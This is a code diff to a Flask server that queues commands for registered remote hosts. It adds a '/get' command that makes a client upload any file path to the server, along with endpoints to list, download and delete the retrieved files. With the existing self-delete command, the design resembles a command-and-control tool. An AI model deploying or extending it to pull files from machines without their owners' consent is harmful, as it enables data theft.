@@ -3,6 +3,8 @@ from flask_cors import CORS
 from flask_migrate import Migrate
 from flask_login import LoginManager, login_user, logout_user, login_required, current_user
 import os
+import re
+import shutil
 import requests
 import json
 from dotenv import load_dotenv
@@ -217,6 +219,10 @@ def api_deregister_host(host_id):
         # Delete the host
         db.session.delete(host)
         db.session.commit()
+        
+        # Delete all uploaded files for this host
+        delete_host_uploaded_files(host_id)
+        
         return json.dumps({'success': True, 'message': f'Host {hostname} deregistered'}), 200, {'Content-Type': 'application/json'}
     except Exception as e:
         db.session.rollback()
@@ -238,6 +244,10 @@ def delete_host(host_id):
         Command.query.filter_by(host_id=host_id).delete()
         db.session.delete(host)
         db.session.commit()
+        
+        # Delete all uploaded files for this host
+        delete_host_uploaded_files(host_id)
+        
         flash(f'Host {hostname} deleted successfully.', 'success')
     except Exception as e:
         db.session.rollback()
@@ -349,6 +359,28 @@ def api_create_command(host_id):
                 'message': 'Delete command queued. Client will deregister, delete executable, and exit.',
                 'command': command.to_dict()
             }), 201, {'Content-Type': 'application/json'}
+        elif cmd_str.startswith('/get '):
+            # Parse: /get /path/to/file
+            try:
+                parts = cmd_str.split(' ', 1)
+                if len(parts) == 2:
+                    file_path = parts[1].strip()
+                    # Create a command record so client receives it
+                    command = Command(
+                        host_id=host_id,
+                        command=cmd_str,
+                        status='pending'
+                    )
+                    db.session.add(command)
+                    db.session.commit()
+                    return json.dumps({
+                        'success': True,
+                        'message': f'File upload command queued for: {file_path}',
+                        'command': command.to_dict()
+                    }), 201, {'Content-Type': 'application/json'}
+            except Exception as e:
+                pass
+            return json.dumps({'error': 'Invalid format. Use: /get <filepath>'}), 400, {'Content-Type': 'application/json'}
         elif cmd_str.startswith('/set-idle-timeout'):
             # Parse: /set-idle-timeout 5
             try:
@@ -423,6 +455,7 @@ def console(host_id=None):
     """Console page - requires authentication. Optionally for a specific host."""
     host = None
     commands = []
+    uploaded_files = []
     if host_id:
         host = Host.query.get(host_id)
         if not host:
@@ -430,7 +463,23 @@ def console(host_id=None):
             return redirect(url_for('hosts'))
         # Get recent commands for this host
         commands = Command.query.filter_by(host_id=host_id).order_by(Command.created_at.desc()).limit(50).all()
-    return render_template('console.html', host=host, commands=commands)
+        # Get uploaded files
+        uploads_dir = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id)
+        if os.path.exists(uploads_dir):
+            try:
+                for filename in os.listdir(uploads_dir):
+                    file_path = os.path.join(uploads_dir, filename)
+                    if os.path.isfile(file_path):
+                        stat = os.stat(file_path)
+                        uploaded_files.append({
+                            'filename': filename,
+                            'size': stat.st_size,
+                            'uploaded_at': datetime.fromtimestamp(stat.st_mtime)
+                        })
+                uploaded_files.sort(key=lambda x: x['uploaded_at'], reverse=True)
+            except Exception as e:
+                print(f"Error reading uploaded files: {e}")
+    return render_template('console.html', host=host, commands=commands, uploaded_files=uploaded_files)
 
 
 @app.route('/api/hosts', methods=['GET'])
@@ -769,6 +818,148 @@ def init_db():
 
 # Don't run init_db on import - only when explicitly running the app
 # This prevents issues with Flask CLI commands
+@app.route('/api/hosts/<host_id>/upload', methods=['POST'])
+def api_upload_file(host_id):
+    """API endpoint for clients to upload files."""
+    host = Host.query.get(host_id)
+    if not host:
+        return json.dumps({'error': 'Host not found'}), 404, {'Content-Type': 'application/json'}
+    
+    # Check if file is in request
+    if 'file' not in request.files:
+        return json.dumps({'error': 'No file provided'}), 400, {'Content-Type': 'application/json'}
+    
+    file = request.files['file']
+    if file.filename == '':
+        return json.dumps({'error': 'No file selected'}), 400, {'Content-Type': 'application/json'}
+    
+    # Get file path from form data
+    file_path = request.form.get('file_path', '')
+    if not file_path:
+        return json.dumps({'error': 'File path not provided'}), 400, {'Content-Type': 'application/json'}
+    
+    # Create uploads directory if it doesn't exist
+    uploads_dir = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id)
+    os.makedirs(uploads_dir, exist_ok=True)
+    
+    # Sanitize filename: extract just the filename and extension, remove path and special characters
+    # Get just the filename (no path)
+    safe_filename = os.path.basename(file_path)
+    if not safe_filename:
+        safe_filename = 'uploaded_file'
+    
+    # Remove special characters: slashes, percents, quotes, dollar signs, and other problematic chars
+    # Keep alphanumeric, dots, hyphens, underscores, and spaces
+    safe_filename = re.sub(r'[\/\\%"\$<>|:*?]', '', safe_filename)
+    
+    # Ensure we have a valid filename
+    if not safe_filename or safe_filename.strip() == '':
+        # Extract extension if possible, otherwise use default
+        _, ext = os.path.splitext(os.path.basename(file_path))
+        safe_filename = f'uploaded_file{ext}' if ext else 'uploaded_file'
+    
+    # Add timestamp to avoid conflicts
+    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+    safe_filename = f"{timestamp}_{safe_filename}"
+    
+    # Save file
+    file_path_on_server = os.path.join(uploads_dir, safe_filename)
+    try:
+        file.save(file_path_on_server)
+        file_size = os.path.getsize(file_path_on_server)
+        
+        return json.dumps({
+            'success': True,
+            'message': f'File uploaded successfully',
+            'filename': safe_filename,
+            'original_path': file_path,
+            'size': file_size
+        }), 200, {'Content-Type': 'application/json'}
+    except Exception as e:
+        return json.dumps({'error': f'Failed to save file: {str(e)}'}), 500, {'Content-Type': 'application/json'}
+
+
+@app.route('/api/hosts/<host_id>/files', methods=['GET'])
+@middleware_auth
+def api_list_files(host_id):
+    """API endpoint to list uploaded files for a host."""
+    host = Host.query.get(host_id)
+    if not host:
+        return json.dumps({'error': 'Host not found'}), 404, {'Content-Type': 'application/json'}
+    
+    uploads_dir = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id)
+    files = []
+    
+    if os.path.exists(uploads_dir):
+        for filename in os.listdir(uploads_dir):
+            file_path = os.path.join(uploads_dir, filename)
+            if os.path.isfile(file_path):
+                stat = os.stat(file_path)
+                files.append({
+                    'filename': filename,
+                    'size': stat.st_size,
+                    'uploaded_at': datetime.fromtimestamp(stat.st_mtime).isoformat()
+                })
+    
+    # Sort by upload time (newest first)
+    files.sort(key=lambda x: x['uploaded_at'], reverse=True)
+    
+    return json.dumps({'success': True, 'files': files}), 200, {'Content-Type': 'application/json'}
+
+
+@app.route('/api/hosts/<host_id>/files/<filename>', methods=['GET'])
+@middleware_auth
+def api_download_file(host_id, filename):
+    """API endpoint to download an uploaded file."""
+    host = Host.query.get(host_id)
+    if not host:
+        return json.dumps({'error': 'Host not found'}), 404, {'Content-Type': 'application/json'}
+    
+    # Sanitize filename to prevent directory traversal
+    safe_filename = os.path.basename(filename)
+    file_path = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id, safe_filename)
+    
+    # Verify file exists and is within uploads directory
+    if not os.path.exists(file_path) or not file_path.startswith(os.path.join(os.path.dirname(__file__), 'data', 'uploads')):
+        return json.dumps({'error': 'File not found'}), 404, {'Content-Type': 'application/json'}
+    
+    return send_file(file_path, as_attachment=True, download_name=safe_filename)
+
+
+@app.route('/api/hosts/<host_id>/files/<filename>', methods=['DELETE'])
+@middleware_auth
+def api_delete_file(host_id, filename):
+    """API endpoint to delete an uploaded file."""
+    host = Host.query.get(host_id)
+    if not host:
+        return json.dumps({'error': 'Host not found'}), 404, {'Content-Type': 'application/json'}
+    
+    # Sanitize filename to prevent directory traversal
+    safe_filename = os.path.basename(filename)
+    file_path = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id, safe_filename)
+    
+    # Verify file exists and is within uploads directory
+    if not os.path.exists(file_path) or not file_path.startswith(os.path.join(os.path.dirname(__file__), 'data', 'uploads')):
+        return json.dumps({'error': 'File not found'}), 404, {'Content-Type': 'application/json'}
+    
+    try:
+        os.remove(file_path)
+        return json.dumps({'success': True, 'message': f'File {safe_filename} deleted successfully'}), 200, {'Content-Type': 'application/json'}
+    except Exception as e:
+        return json.dumps({'error': f'Failed to delete file: {str(e)}'}), 500, {'Content-Type': 'application/json'}
+
+
+def delete_host_uploaded_files(host_id):
+    """Delete all uploaded files for a host."""
+    uploads_dir = os.path.join(os.path.dirname(__file__), 'data', 'uploads', host_id)
+    if os.path.exists(uploads_dir):
+        try:
+            shutil.rmtree(uploads_dir)
+            print(f"Deleted uploaded files directory for host {host_id}")
+        except Exception as e:
+            print(f"Error deleting uploaded files for host {host_id}: {e}")
+
+
 if __name__ == '__main__':
     init_db()
     app.run(debug=False, host='0.0.0.0', port=8080)
